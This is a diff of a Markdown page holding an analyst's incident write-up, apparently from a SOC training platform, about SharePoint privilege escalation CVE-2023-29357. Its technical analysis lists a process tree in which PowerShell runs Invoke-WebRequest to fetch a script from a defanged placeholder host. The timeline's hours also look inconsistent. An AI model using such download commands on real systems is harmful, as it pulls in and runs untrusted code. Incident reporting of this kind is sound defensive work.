@@ -1,52 +1,63 @@
 ---
+layout: page
 title: "SOC227 — Microsoft SharePoint Server Elevation of Privilege"
-description: "Analyst Write Up."
-image: /assets/images/og-default.png
+description: "Analyst Write-Up · CVE-2023-29357 Investigation"
+image: /assets/images/projects/sharepoint-cve.png
 tags: [sharepoint, cve-2023-29357, privilege-escalation]
 weight: 10
 ---
 
-
-<!-- Brand banner -->
-<div style="display:flex;align-items:center;gap:16px;padding:18px 20px;border-radius:16px;background:linear-gradient(135deg,#0b1220,#121a2a 55%,#1e2a44);color:#e8eefc;border:1px solid rgba(255,255,255,.06);margin-bottom:24px;">
-  <img src="/assets/images/brand/brandmark.png" alt="Brandon Love brand" style="width:56px;height:56px;border-radius:12px;object-fit:cover;" onerror="this.style.display='none'">
- 
-## 1) Executive Summary
-
-Example: On Oct 6, 2023, suspicious Microsoft SharePoint Server Elevation of Privilege(CVE-2023-29357) was detected on host `MS-SharePointServer`. Investigation confirmed the activity was malicious; containment actions prevented further impact. No lateral movement observed.
+<!-- === Brand Banner === -->
+<div style="display:flex;align-items:center;gap:18px;padding:20px;border-radius:18px;background:linear-gradient(135deg,#0b1220,#121a2a 55%,#1e2a44);border:1px solid rgba(255,255,255,.06);margin-bottom:24px;color:#e8eefc;">
+  <img src="/assets/images/brand/brandmark.png" alt="Brandon Love brand" style="width:60px;height:60px;border-radius:12px;object-fit:cover;" onerror="this.style.display='none'">
+  <div>
+    <div style="font-weight:700;font-size:22px;letter-spacing:.2px;">SOC227 — Microsoft SharePoint EoP</div>
+    <div style="opacity:.85;font-size:14px;">CVE-2023-29357 · DFIR / Incident Response Report</div>
+  </div>
+</div>
 
 ---
 
-## 2) Incident Details
+## 1️⃣ Executive Summary
+On **Oct 6, 2023**, a suspicious Microsoft SharePoint Server Elevation of Privilege (**CVE-2023-29357**) was detected on host `MS-SharePointServer`.  
+Investigation confirmed the activity was **malicious**; containment actions prevented further impact.  
+No lateral movement was observed.
+
+---
+
+## 2️⃣ Incident Details
+
 | Field | Description |
-|------|-------------|
+|-------|-------------|
 | **Incident ID** | 189 |
-| **Analyst** | |
-| **Date/Time Detected** | Oct 6, 2023 08:05PM |
+| **Analyst** | Brandon Love |
+| **Date/Time Detected** | Oct 6, 2023 – 08:05 PM CST |
 | **Severity** | Critical |
 | **Category** | Privilege Escalation |
 | **Detection Source** | EDR |
 | **Business Impact** | None |
 | **Systems Affected** | MS-SharePoint Server |
-| **Users Involved** | none |
+| **Users Involved** | None |
 
 ---
 
-## 3) Timeline of Events (CST)
+## 3️⃣ Timeline of Events (CST)
 | Time | Event |
-|-----:|-------|
+|------|-------|
 | 20:05 | Detection triggered |
 | 09:00 | Analyst investigation started |
-| 09:30 | Containment performed |
 | 09:20 | Root cause identified |
+| 09:30 | Containment performed |
 | 09:45 | Incident resolved |
 
 ---
 
-## 4) Technical Analysis
-**Process Tree:**  
-```
+## 4️⃣ Technical Analysis
+
+**Process Tree**
+```plaintext
 explorer.exe → powershell.exe → Invoke-WebRequest http://example[.]com/file.ps1
+
 ```
 **File Hashes:**  
 - SHA256: `none`  
